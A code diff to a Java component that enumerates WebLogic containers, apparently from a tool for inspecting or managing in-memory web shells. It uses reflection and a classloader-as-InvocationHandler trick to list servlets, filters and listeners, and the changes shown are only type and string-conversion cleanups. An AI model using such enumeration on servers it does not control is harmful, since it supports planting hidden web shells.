@@ -7,8 +7,8 @@ import java.lang.reflect.Method;
 import java.util.*;
 
 public class WeblogicContainerManageComponent implements Runnable {
-    private HashMap params;
-    private HashMap results;
+    private HashMap<String, Object> params;
+    private HashMap<String, Object> results;
 
     public void run() {
         java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
@@ -72,9 +72,9 @@ public class WeblogicContainerManageComponent implements Runnable {
         for (Object context:contexts) {
             try {
                 HashMap contextInfo=new HashMap();
-                contextInfo.put("name",getFV(context,"contextName"));
-                contextInfo.put("basePath",getFV(context,"contextPath"));
-                contextInfo.put("workDir",getFV(context,"docroot"));
+                contextInfo.put("name",String.valueOf(getFV(context,"contextName")));
+                contextInfo.put("basePath",String.valueOf(getFV(context,"contextPath")));
+                contextInfo.put("workDir",String.valueOf(getFV(context,"docroot")));
                 contextInfo.put("allFilter",getAllFilter(context));
                 contextInfo.put("allServlet",getAllServlet(context));
                 contextInfo.put("allListener",getAllListener(context));
@@ -103,9 +103,9 @@ public class WeblogicContainerManageComponent implements Runnable {
                 Object urlPatterns=invokeMethod(map,"keys");
                 filterInfo.put("filterName",filterName);
                 filterInfo.put("servletName", servletName);
-                filterInfo.put("urlPatterns",urlPatterns);
+                filterInfo.put("urlPatterns",toList(urlPatterns));
                 Object filter=filters.get(filterName);
-                filterInfo.put("filterClassName",getFV(filter, "filterClassName"));
+                filterInfo.put("filterClassName",String.valueOf(getFV(filter, "filterClassName")));
                 allFilterInfo.add(filterInfo);
             }
             return allFilterInfo;
@@ -129,10 +129,10 @@ public class WeblogicContainerManageComponent implements Runnable {
                         exactValue=getFV(fullMatchNode,"patternValue");
                     }
                     HashMap servletInfo=new HashMap();
-                    servletInfo.put("url",invokeMethod(exactValue,"getPattern"));
+                    servletInfo.put("url",String.valueOf(invokeMethod(exactValue,"getPattern")));
                     Object servletStub=invokeMethod(exactValue,"getServletStub");
-                    servletInfo.put("wrapperName",getFV(servletStub, "name"));
-                    servletInfo.put("servletClass",invokeMethod(servletStub,"getClassName"));
+                    servletInfo.put("wrapperName",String.valueOf(getFV(servletStub, "name")));
+                    servletInfo.put("servletClass",String.valueOf(invokeMethod(servletStub,"getClassName")));
                     servlets.add(servletInfo);
                 } catch (Exception var9) {
                 }
@@ -617,6 +617,28 @@ public class WeblogicContainerManageComponent implements Runnable {
                 throw new RuntimeException(e.getMessage());
             }
         }
+    }
+
+    private static ArrayList toList(Object value) {
+        ArrayList answer = new ArrayList();
+        if (value == null) return answer;
+        if (value instanceof Iterable) {
+            Iterator iterator = ((Iterable) value).iterator();
+            while (iterator.hasNext()) answer.add(String.valueOf(iterator.next()));
+            return answer;
+        }
+        if (value instanceof Enumeration) {
+            Enumeration enumeration = (Enumeration) value;
+            while (enumeration.hasMoreElements()) answer.add(String.valueOf(enumeration.nextElement()));
+            return answer;
+        }
+        if (value.getClass().isArray()) {
+            int length = Array.getLength(value);
+            for (int i = 0; i < length; i++) answer.add(String.valueOf(Array.get(value, i)));
+            return answer;
+        }
+        answer.add(String.valueOf(value));
+        return answer;
     }
 
 }
